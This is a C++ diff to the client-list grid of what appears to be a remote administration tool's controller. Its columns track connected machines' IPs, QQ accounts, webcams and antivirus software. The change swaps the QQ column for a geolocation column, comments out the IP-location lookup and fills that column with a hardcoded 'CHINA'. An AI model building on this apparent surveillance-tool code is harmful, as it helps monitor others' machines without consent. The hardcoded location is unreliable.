@@ -33,7 +33,7 @@ typedef struct
 
 ListHeartData g_Heart_Data[] =
 {
-	{_T("地理位置"),	        130	},//0
+	{_T("分组/IP"),	        130	},//0    由地理位置变为分组/IP
 	{_T("网络"),		        38	},
 	{_T("WAN-IP"),		    100	},//1
 	{_T("LAN-IP"),		    100	},//2
@@ -43,7 +43,7 @@ ListHeartData g_Heart_Data[] =
 	{_T("内存/可用"),       90	},//5
 	{_T("硬盘/可用"),       90	},//5
 	{_T("在线状态/延迟"),       90	},//5
-	{_T("在线QQ号"),       90	},//5
+	{_T("地理位置"),       90	},//5     由qq 变为地理位置
 	{_T("网卡"),           90	},//5
 	{_T("视频"),		      	50	},//7
 	{_T("杀毒软件"),	        95  },//9
@@ -270,17 +270,17 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
 		lpItemInfo->SetItemText(IPAddress);
 		
-		//地理位置
-		if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
-		{
-			str = m_QQwry->IPtoAdd(IPAddress);
-			//			m_pListCtrl->SetItemText(i, 10, str);
-			lpItemInfo->AddSubItemText(str);
-			strToolTipsText += "\nArea : ";
-			strToolTipsText += str;
-			IPAddress += "地理位置: ";
-			IPAddress += str;
-		}
+		////地理位置
+		//if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
+		//{
+		//	str = m_QQwry->IPtoAdd(IPAddress);
+		//	//			m_pListCtrl->SetItemText(i, 10, str);
+		//	lpItemInfo->AddSubItemText(str);
+		//	strToolTipsText += "\nArea : ";
+		//	strToolTipsText += str;
+		//	IPAddress += "地理位置: ";
+		//	IPAddress += str;
+		//}
 		//lpItemInfo->AddSubItemText(IPAddress);
 		// 网络类型
 		if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
@@ -430,9 +430,21 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		//在线状态/延迟
 		str.Format("%s / %d/mS", LoginInfo->bIsActive ? _T(" 离线") : _T(" 在线"),LoginInfo->dwSpeed);
 		lpItemInfo->AddSubItemText(str);
-		// 在线QQ号
-		str.Format("%s", LoginInfo->nQQ);
-		lpItemInfo->AddSubItemText(str);
+		//// 在线QQ号
+		//str.Format("%s", LoginInfo->nQQ);
+		//lpItemInfo->AddSubItemText(str);
+				//地理位置
+		//if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
+		//{
+		//	str = m_QQwry->IPtoAdd(IPAddress);
+		//	//			m_pListCtrl->SetItemText(i, 10, str);
+		//	lpItemInfo->AddSubItemText(str);
+		//	strToolTipsText += "\nArea : ";
+		//	strToolTipsText += str;
+		//	IPAddress += "地理位置: ";
+		//	IPAddress += str;
+		//}
+		lpItemInfo->AddSubItemText("CHINA");
         
 		// 网卡
 		if (LoginInfo->Speed >= 1000)
